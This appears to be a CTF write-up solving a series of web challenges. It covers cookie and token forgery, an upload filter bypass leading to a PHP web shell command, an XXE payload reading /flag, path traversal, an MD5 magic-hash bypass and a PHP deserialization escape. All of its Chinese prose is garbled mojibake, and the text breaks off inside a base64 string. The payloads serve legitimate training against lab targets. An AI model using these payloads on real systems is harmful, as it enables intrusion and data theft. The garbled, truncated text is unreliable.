<p><strong>å†™çš„ä¸å¥½å„ä½å¸ˆå‚…è§è°…</strong></p>
<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><p>CHALLENGE: http<br>DESCRIPTION: å¬è¯´è¿™ä¸ªhttpé‡Œè¿˜æœ‰ä¸ªä»€ä¹ˆä¸œè¥¿å«é¥¼å¹²ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯åƒçš„</p>
<p>æ ¹æ®é¢˜ç›®æè¿°ï¼Œè²Œä¼¼å’Œæ•°æ®åŒ…æœ‰å…³ç³»ä½¿ç”¨ä»£ç†è½¯ä»¶è¿æ¥èŠ‚ç‚¹è®¿é—®å‘ç°æŒ‰ç…§è¦æ±‚æäº¤å‚æ•°å³å¯è·å¾—</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907111357690.png" alt="image-20230907111357690"></p>
<pre><code class="bash">POST /?UwU=u HTTP/1.1
Host: localhost:64168
Cache-Control: max-age=0
sec-ch-ua: &quot;Chromium&quot;;v=&quot;109&quot;, &quot;Not_A Brand&quot;;v=&quot;99&quot;
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: &quot;Windows&quot;
Upgrade-Insecure-Requests: 1
User-Agent: MoeBrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
X-Forwarded-For:127.0.0.1
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: character=admin
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

Luv=u
</code></pre>
<p>æŒ‰ç…§è¦æ±‚æäº¤å‚æ•°å³å¯</p>
<h1 id="Webå…¥é—¨æŒ‡åŒ—"><a href="#Webå…¥é—¨æŒ‡åŒ—" class="headerlink" title="Webå…¥é—¨æŒ‡åŒ—"></a>Webå…¥é—¨æŒ‡åŒ—</h1><p>è§£å‡ºPDFç¼–ç å³å¯</p>
<h1 id="å½¼å²¸çš„flag"><a href="#å½¼å²¸çš„flag" class="headerlink" title="å½¼å²¸çš„flag"></a>å½¼å²¸çš„flag</h1><p>CHALLENGE: å½¼å²¸çš„flag<br>DESCRIPTION: æˆ‘ä»¬åœ¨æŸä¸ªå¹³è¡Œå®‡å®™ä¸­å¾—åˆ°äº†ä¸€æ®µmoectfç¾¤çš„èŠå¤©è®°å½•ï¼Œç²—å¿ƒçš„å‡ºé¢˜äººåœ¨è¿™ä¸ªèŠå¤©å¹³å°ä¸å°å¿ƒæ³„éœ²äº†è‡ªå·±çš„flag</p>
<p><strong>æ‰“å¼€å¯è§ä¸€ä¸ªèŠå¤©é¡µé¢</strong></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907151259825.png" alt="image-20230907151259825"></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907151709517.png" alt="image-20230907151709517"></p>
<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>CHALLENGE: cookie<br>DESCRIPTION: <strong>æœ¬é¢˜æ— éœ€æ‰«æå™¨&#x2F;çˆ†ç ´</strong><br>hint: readmeåªæ˜¯ä¸€ä¸ªæ ·ä¾‹ï¼Œä¸æ˜¯æ‹¿æ¥å¤åˆ¶çš„</p>
<p>æ ¹æ®é¢˜ç›®ç»™å‡ºçš„é™„ä»¶å¤§è‡´æ„æ€éœ€è¦æ³¨å†Œç”¨æˆ·æ¥ç™»å½•è·å–flag</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907152055953.png" alt="image-20230907152055953"></p>
<pre><code class="bash">POST /register HTTP/1.1
Host: localhost:62915
sec-ch-ua: &quot;Chromium&quot;;v=&quot;109&quot;, &quot;Not_A Brand&quot;;v=&quot;99&quot;
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: &quot;Windows&quot;
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: character=guest
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

{
    &quot;username&quot;:&quot;abc&quot;,
    &quot;password&quot;:&quot;123456&quot;
}
</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907152326552.png" alt="image-20230907152326552"></p>
<p>è®¿é—®ç™»å½•æ¥å£ä½¿ç”¨æ³¨å†Œçš„è´¦å·è¿›è¡Œç™»å½•å¯å‘ç°å­˜åœ¨token</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907152633221.png" alt="image-20230907152633221"></p>
<pre><code>eyJ1c2VybmFtZSI6ICJhYmMiLCAicGFzc3dvcmQiOiAiMTIzNDU2IiwgInJvbGUiOiAidXNlciJ9

{&quot;username&quot;: &quot;abc&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;role&quot;: &quot;user&quot;}

base64
</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907153346433.png" alt="image-20230907153346433"></p>
<pre><code>æ›´æ”¹tokenå³å¯
eyJ1c2VybmFtZSI6ICJhYmMiLCAicGFzc3dvcmQiOiAiMTIzNDU2IiwgInJvbGUiOiAiYWRtaW4ifQ==
{&quot;username&quot;: &quot;abc&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;role&quot;: &quot;admin&quot;}
base64ç¼–ç 
</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907153530460.png" alt="image-20230907153530460"></p>
<h1 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h1><p>CHALLENGE: gas!gas!gas!<br>DESCRIPTION: Kluttonè¿™ä¸ªå‡æœŸä¿¡å¿ƒæ»¡æ»¡åœ°å‡†å¤‡æŠŠé©¾ç…§æ‹¿ä¸‹ï¼Œäºæ˜¯ä»–ä»”ç»†åœ°å­¦ä¹ äº†å¥½å¤šæ¼‚ç§»è§†é¢‘ï¼Œè¿˜å‡†å¤‡äº†è¿™ä¹ˆä¸€ä¸ªèµ›åšèµ›è½¦åœºï¼›è¯¶ï¼Œä¸å¯¹ï¼Œå¼€è½¦å¥½åƒä¸æ˜¯ç”¨é”®ç›˜å¼€çš„ï¼Ÿ</p>
<p>æ‰“å¼€é¢˜ç›®éœ€è¦è¿ç»­å¯¹åšæŒäº”ä¼¦</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907153929231.png" alt="image-20230907153929231"></p>
<p>æŸ¥çœ‹æºç å‘ç°å­˜åœ¨å¦‚ä¸‹ç‰‡æ®µ</p>
<pre><code class="HTML"> &lt;form action=&quot;/&quot; method=&quot;POST&quot;&gt;
    &lt;label for=&quot;driver&quot;&gt;é€‰æ‰‹:&lt;/label&gt;
    &lt;input type=&quot;text&quot; id=&quot;driver&quot; name=&quot;driver&quot; required&gt;&lt;br&gt;&lt;br&gt;
    
    &lt;label for=&quot;steering_control&quot;&gt;æ–¹å‘æ§åˆ¶:&lt;/label&gt;
    &lt;select id=&quot;steering_control&quot; name=&quot;steering_control&quot; required&gt;
      &lt;option value=&quot;-1&quot;&gt;å·¦&lt;/option&gt;
      &lt;option value=&quot;0&quot; selected&gt;ç›´è¡Œ&lt;/option&gt;
      &lt;option value=&quot;1&quot;&gt;å³&lt;/option&gt;
    &lt;/select&gt;&lt;br&gt;&lt;br&gt;

    &lt;label for=&quot;throttle&quot;&gt;æ²¹é—¨æ§åˆ¶:&lt;/label&gt;
    &lt;select id=&quot;throttle&quot; name=&quot;throttle&quot; required&gt;
      &lt;option value=&quot;0&quot;&gt;æ¾å¼€&lt;/option&gt;
      &lt;option value=&quot;1&quot;&gt;ä¿æŒ&lt;/option&gt;
      &lt;option value=&quot;2&quot; selected&gt;å…¨å¼€&lt;/option&gt;
    &lt;/select&gt;&lt;br&gt;&lt;br&gt;
    
    &lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;
  &lt;/form&gt;
</code></pre>
<p>æ ¹æ®è¿™äº›ä¿¡æ¯ç¼–å†™è„šæœ¬å³å¯</p>
<pre><code class="python">import requests
import re
url = &#39;http://localhost:64461/&#39;
headers = {&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;}
s = requests.Session()
req_post = s.post(
    url=url,
    data=&#39;driver=q1&amp;steering_control=0&amp;throttle=2&#39;,
    headers=headers)
print(f&#39;cookies = {s.cookies}&#39;)
post_data = &#39;driver=q1jun&amp;steering_control=0&amp;throttle=2&#39;
print(re.findall(r&#39;&lt;h3&gt;&lt;font color=&quot;red&quot;&gt;(.*)&lt;/font&gt;&lt;/h3&gt;&lt;/div&gt;&#39;,req_post.text)[0])
req = req_post.text
steering_control = 0
throttle = 0
for _ in range(7):
    if &#39;å¼¯é“å‘å·¦&#39; in req_post.text:
        steering_control = 1
    if &#39;å¼¯é“å‘å³&#39; in req_post.text:
        steering_control = -1
    if &#39;å¼¯é“ç›´è¡Œ&#39; in req_post.text:
        steering_control = 0
    if &#39;ä¿æŒè¿™ä¸ªé€Ÿåº¦&#39; in req_post.text:
        throttle = 1
    if &#39;æŠ“åœ°åŠ›å¤ªå¤§äº†&#39; in req_post.text:
        throttle = 2
    if &#39;æŠ“åœ°åŠ›å¤ªå°äº†&#39; in req_post.text:
        throttle = 0
    print(f&#39;{steering_control =}&#39;)
    print(f&#39;{throttle =}&#39;)
    req_post = s.post(
        url=url,
        data=f&#39;driver=q1&amp;steering_control={steering_control}&amp;throttle={throttle}&#39;,
        headers=headers
    )
    print(req_post.text)
    # print(re.findall(r&#39;&lt;h3&gt;&lt;font color=&quot;red&quot;&gt;(.*)&lt;/font&gt;&lt;/h3&gt;&lt;/div&gt;&#39;,req_post.text)[0])
    print(f&#39;cookies = {s.cookies}&#39;)
</code></pre>
<h1 id="moeå›¾åºŠ"><a href="#moeå›¾åºŠ" class="headerlink" title="moeå›¾åºŠ"></a>moeå›¾åºŠ</h1><p>CHALLENGE: moeå›¾åºŠ<br>DESCRIPTION: æˆ‘ä»¬å‡†å¤‡äº†ä¸€ä¸ªmoeå›¾åºŠç”¨äºä¸Šä¼ ä¸€äº›å›¾ç‰‡</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907154510412.png" alt="image-20230907154510412"></p>
<p>æ­£å¸¸çš„å›¾ç‰‡æ²¡å•¥é—®é¢˜ï¼Œphpå°±æ— æ³•è¿›è¡Œä¸Šä¼ </p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907154700645.png" alt="image-20230907154700645"></p>
<p>å®¡è®¡jsæºç å‘ç°ç”¨ç‚¹åˆ†éš”åç¼€åå­—å¤šåŠ ä¸€ä¸ªç‚¹å°±æŠŠå‰ä¸€ä¸ªç‚¹è¿›è¡Œäº†ç»•è¿‡</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907155030664.png" alt="image-20230907155030664"></p>
<p>å›¾ç‰‡ğŸå¯æˆåŠŸä¸Šä¼ </p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907155156281.png" alt="image-20230907155156281"></p>
<p>æ‰§è¡Œå‘½ä»¤å³å¯</p>
<pre><code>?cmd=system(%27ls%20/%27);
</code></pre>
<h1 id="è§£ä½ çš„åº§é©¾"><a href="#è§£ä½ çš„åº§é©¾" class="headerlink" title="è§£ä½ çš„åº§é©¾"></a>è§£ä½ çš„åº§é©¾</h1><p>CHALLENGE: äº†è§£ä½ çš„åº§é©¾<br>DESCRIPTION: ä¸ºäº†æè‡´åœ°æ¼‚ç§»ï¼Œæˆ‘ä»¬å‡†å¤‡äº†ä¸€ä¸ªç½‘ç«™ç”¨äºæŸ¥æ‰¾ä½ å–œæ¬¢çš„è½¦è½¦ï¼›å¬è¯´flagä¹Ÿæ”¾åœ¨é‡Œé¢äº†ï¼Œä¸è¿‡ä¸åœ¨ç½‘ç«™ç›®å½•æ”¾åœ¨æ ¹ç›®å½•åº”è¯¥æ²¡é—®é¢˜çš„å§ã€‚ã€‚ã€‚</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907155632658.png" alt="image-20230907155632658"></p>
<p>xmlæ³¨å…¥ä½¿ç”¨payloadå³å¯</p>
<pre><code>xml_content=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%3C!DOCTYPE%20xxe%20%5B%3C!ELEMENT%20name%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fflag%22%20%3E%5D%3E%3Cxml%3E%3Cname%3E%26xxe%3B%3C%2Fname%3E%3C%2Fxml%3E
</code></pre>
<h1 id="å¤§æµ·æé’ˆ"><a href="#å¤§æµ·æé’ˆ" class="headerlink" title="å¤§æµ·æé’ˆ"></a>å¤§æµ·æé’ˆ</h1><p>CHALLENGE: å¤§æµ·æé’ˆ<br>DESCRIPTION: è¯¥æ­»ï¼Œä¹‹å‰çš„å¹³è¡Œå®‡å®™ç”±äºflagçš„æ³„éœ²è¢«ä¸€è‚¡ç¥ç§˜åŠ›é‡æŠ¹å»ï¼Œæˆ‘ä»¬è„±ç¦»äº†ä¸é‚£ä¸ªå®‡å®™çš„è¿æ¥äº†ï¼ä¸è¿‡ä¸ç”¨æ‹…å¿ƒï¼Œçœ‹èµ·æ¥å‡ºé¢˜äººå‚»ä¹ä¹çš„æ˜¯å…·æœ‰æ³„éœ²flagçš„æ¦‚ç‡çš„ï¼Œæˆ‘ä»¬åªéœ€è¦è¿æ¥å¤šä¸ªå¹³è¡Œå®‡å®™â€¦ï¼ˆéš¾é“flagåœ¨å¤šå…ƒå®‡å®™é‡Œæ˜¯å…¨å±€å˜é‡å—ï¼‰</p>
<p>tips:ä»…æœ‰è¿™é“é¢˜è¦ç”¨åˆ°æ‰«æå™¨ï¼Œè¯·ä¸è¦å°†çˆ†ç ´é€Ÿåº¦è°ƒæ•´è¿‡å¿«ï¼Œflagæ˜¯ä¸€å®šèƒ½æ‰¾åˆ°çš„<br>ç¯å¢ƒï¼š<br><a href="http://101.42.178.83:7771/">http://101.42.178.83:7771/</a></p>
<p>æ‰“å¼€é¢˜ç›®å¯è§åªéœ€è¦bpè·‘ä¸€åˆ°ä¸€åƒçš„æ•°å­—å³å¯</p>
<pre><code>use /?id=&lt;1-1000&gt; to connect to different parallel universes
</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907160340776.png" alt="image-20230907160340776"></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907160551761.png" alt="image-20230907160551761"></p>
<h1 id="meoå›¾åºŠ"><a href="#meoå›¾åºŠ" class="headerlink" title="meoå›¾åºŠ"></a>meoå›¾åºŠ</h1><p>CHALLENGE: meoå›¾åºŠ<br>DESCRIPTION: æˆ‘ä»¬å‡†å¤‡äº†ä¸€ä¸ªmeo(?)å›¾åºŠç”¨äºä¸Šä¼ ä¸€äº›å›¾ç‰‡</p>
<pre><code>å¯ä»¥ç›´æ¥ä¸Šä¼ phpä½†æ˜¯ä¸è¿›è¡Œè§£æï¼ŒæŸ¥çœ‹å‘ç°å­˜åœ¨æ–‡ä»¶åŒ…å«
</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907162316680.png" alt="image-20230907162316680"></p>
<pre><code>è¯»å–è¿™ä¸ªå‘ç°å¦‚ä¸‹æç¤º
http://localhost:54781/images.php?name=../../../../../../flag

&lt;!--Fl3g_n0t_Here_dont_peek!!!!!.php--&gt;
</code></pre>
<pre><code class="php">&lt;?php

highlight_file(__FILE__);

if (isset($_GET[&#39;param1&#39;]) &amp;&amp; isset($_GET[&#39;param2&#39;])) {
    $param1 = $_GET[&#39;param1&#39;];
    $param2 = $_GET[&#39;param2&#39;];

    if ($param1 !== $param2) {
        
        $md5Param1 = md5($param1);
        $md5Param2 = md5($param2);

        if ($md5Param1 == $md5Param2) {
            echo &quot;O.O!! &quot; . getenv(&quot;FLAG&quot;);
        } else {
            echo &quot;O.o??&quot;;
        }
    } else {
        echo &quot;o.O?&quot;;
    }
} else {
    echo &quot;O.o?&quot;;
}

?&gt;
</code></pre>
<p>md50eè¿›è¡Œç»•è¿‡</p>
<pre><code>param1=QNKCDZO&amp;param2=240610708
</code></pre>
<h1 id="å¤ºå‘½åä¸‰æª"><a href="#å¤ºå‘½åä¸‰æª" class="headerlink" title="å¤ºå‘½åä¸‰æª"></a>å¤ºå‘½åä¸‰æª</h1><p>CHALLENGE: å¤ºå‘½åä¸‰æª<br>DESCRIPTION: å¤ºå‘½åä¸‰æªï¼ç„¶åæ˜¯å•¥æ¥ç€ï¼Ÿ</p>
<p>ä¸»é¡µå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="php">&lt;?php
highlight_file(__FILE__);

require_once(&#39;Hanxin.exe.php&#39;);

$Chant = isset($_GET[&#39;chant&#39;]) ? $_GET[&#39;chant&#39;] : &#39;å¤ºå‘½åä¸‰æª&#39;;

$new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);

$before = serialize($new_visitor);
$after = Deadly_Thirteen_Spears::Make_a_Move($before);
echo &#39;Your Movements: &#39; . $after . &#39;&lt;br&gt;&#39;;

try{
    echo unserialize($after);
}catch (Exception $e) {
    echo &quot;Even Caused A Glitch...&quot;;
}
?&gt;
</code></pre>
<p>å¾ˆæ˜æ˜¾æ˜¯ååºåˆ—åŒ–ï¼Œæ ¹æ®ä»£ç è¿˜æœ‰ä¸€ä¸ªâ€™Hanxin.exe.phpâ€™é¡µé¢</p>
<pre><code class="php">&lt;?php

if (basename($_SERVER[&#39;SCRIPT_FILENAME&#39;]) === basename(__FILE__)) {
    highlight_file(__FILE__);
}

class Deadly_Thirteen_Spears{
    private static $Top_Secret_Long_Spear_Techniques_Manual = array(
        &quot;di_yi_qiang&quot; =&gt; &quot;Lovesickness&quot;,
        &quot;di_er_qiang&quot; =&gt; &quot;Heartbreak&quot;,
        &quot;di_san_qiang&quot; =&gt; &quot;Blind_Dragon&quot;,
        &quot;di_si_qiang&quot; =&gt; &quot;Romantic_charm&quot;,
        &quot;di_wu_qiang&quot; =&gt; &quot;Peerless&quot;,
        &quot;di_liu_qiang&quot; =&gt; &quot;White_Dragon&quot;,
        &quot;di_qi_qiang&quot; =&gt; &quot;Penetrating_Gaze&quot;,
        &quot;di_ba_qiang&quot; =&gt; &quot;Kunpeng&quot;,
        &quot;di_jiu_qiang&quot; =&gt; &quot;Night_Parade_of_a_Hundred_Ghosts&quot;,
        &quot;di_shi_qiang&quot; =&gt; &quot;Overlord&quot;,
        &quot;di_shi_yi_qiang&quot; =&gt; &quot;Letting_Go&quot;,
        &quot;di_shi_er_qiang&quot; =&gt; &quot;Decisive_Victory&quot;,
        &quot;di_shi_san_qiang&quot; =&gt; &quot;Unrepentant_Lethality&quot;
    );

    public static function Make_a_Move($move){
        foreach(self::$Top_Secret_Long_Spear_Techniques_Manual as $index =&gt; $movement){
            $move = str_replace($index, $movement, $move);
        }
        return $move;
    }
}

class Omg_It_Is_So_Cool_Bring_Me_My_Flag{

    public $Chant = &#39;&#39;;
    public $Spear_Owner = &#39;Nobody&#39;;

    function __construct($chant){
        $this-&gt;Chant = $chant;
        $this-&gt;Spear_Owner = &#39;Nobody&#39;;
    }

    function __toString(){
        if($this-&gt;Spear_Owner !== &#39;MaoLei&#39;){
            return &#39;Far away from COOL...&#39;;
        }
        else{
            return &quot;Omg You&#39;re So COOOOOL!!! &quot; . getenv(&#39;FLAG&#39;);
        }
    }
}

?&gt;
</code></pre>
<p>é—®é¢˜çš„å…³é”®ï¼Œå…³é”®çš„é—®é¢˜ï¼Œå°±å¾ˆæ˜æ˜¾äº†ï¼Œå­˜åœ¨ä¸€ä¸ªé™æ€å¼•ç”¨å‡½æ•°Make_a_Move()å…¶ä¸­çš„</p>
<pre><code class="php">$move = str_replace($index, $movement, $move);

#å­˜åœ¨ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ï¼Œä¸å¯æ§çš„åç¼€å˜çš„å¯æ§åˆ¶
</code></pre>
<pre><code class="bash">ç›®çš„æ˜¯åœ¨å¤ºå‘½åä¸‰æªåé¢ä¿®æ”¹ä¸º&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;}ï¼Œè¯¥å­—ç¬¦ä¸²é•¿åº¦ä¸º35ï¼Œæ ¹æ®ä»£ç å¯ä»¥çŸ¥é“&quot;di_qi_qiang&quot; =&gt; &quot;Penetrating_Gaze&quot;,åˆšå¥½æ˜¯ä»11-&gt;16ï¼Œæ¯æ¬¡è½¬æ¢å¯ä»¥é€ƒé€¸5ä¸ªå­—ç¬¦ä¸²ï¼Œåªéœ€è¦é‡å¤7æ¬¡&quot;di_qi_qiang&quot;å³å¯å®Œæˆé€ƒé€¸



chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;}
</code></pre>
<h1 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h1><p>CHALLENGE: signin<br>DESCRIPTION: çœŸçš„æ˜¯signinï¼ˆ<br><strong>æœ¬é¢˜æ— éœ€æ‰«æå™¨&#x2F;çˆ†ç ´</strong></p>
<p>é¢˜ç›®ä»£ç :</p>
<pre><code class="python">from secrets import users, salt
import hashlib
import base64
import json
import http.server

with open(&quot;flag.txt&quot;,&quot;r&quot;) as f:
    FLAG = f.read().strip()

def gethash(*items):
    c = 0
    for item in items:
        if item is None:
            continue
        c ^= int.from_bytes(hashlib.md5(f&quot;{salt}[{item}]{salt}&quot;.encode()).digest(), &quot;big&quot;) # it looks so complex! but is it safe enough?
    return hex(c)[2:]

assert &quot;admin&quot; in users
assert users[&quot;admin&quot;] == &quot;admin&quot;

hashed_users = dict((k,gethash(k,v)) for k,v in users.items())

eval(int.to_bytes(0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164^8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153,160,&quot;big&quot;,signed=True).decode().translate({ord(c):None for c in &quot;\x00&quot;})) # what is it?
    
def decrypt(data:str):
        for x in range(5):
            data = base64.b64encode(data).decode() # ummm...? It looks like it&#39;s just base64 encoding it 5 times? truely?
        return data

__page__ = base64.b64encode(&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW